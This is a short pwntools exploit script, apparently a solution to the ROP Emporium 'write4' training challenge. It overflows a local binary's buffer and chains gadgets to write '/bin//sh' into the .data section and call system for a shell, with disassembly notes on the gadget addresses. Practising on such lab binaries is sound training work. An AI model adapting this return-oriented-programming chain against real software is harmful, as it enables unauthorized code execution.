from pwn import *

'''
0x004005e0    1 6            sym.imp.system

root@pochinki:~/ropemporium# objdump -d write4 -j .plt | grep system
00000000004005e0 <system@plt>:
  4005e0:	ff 25 3a 0a 20 00    	jmpq   *0x200a3a(%rip)        # 601020 <system@GLIBC_2.2.5>


rabin2 -S write4
25 0x00001050    16 0x00601050    16 -rw- .data

0x0000000000400890: pop r14; pop r15; ret; 
0x0000000000400820: mov qword ptr [r14], r15; ret; 
0x0000000000400893: pop rdi; ret; 

'''

def main():
	system_plt = 0x004005e0
	data_segment = 0x00601050
	pop_rdi = 0x0000000000400893
	pop_r14_r15 = 0x0000000000400890
	mov_r14_r15 = 0x0000000000400820

	payload = 'A' * 40
	
	#write 8byte /bin/sh\x00
	payload += p64(pop_r14_r15)
	payload += p64(data_segment)
	payload += '/bin//sh'
	payload += p64(mov_r14_r15)

	#call system
	payload += p64(pop_rdi)
	payload += p64(data_segment)
	payload += p64(system_plt)

	p = process('write4')
	print p.recvrepeat(0.2)
	p.sendline(payload)
	p.interactive()

if __name__ == '__main__':
	main()
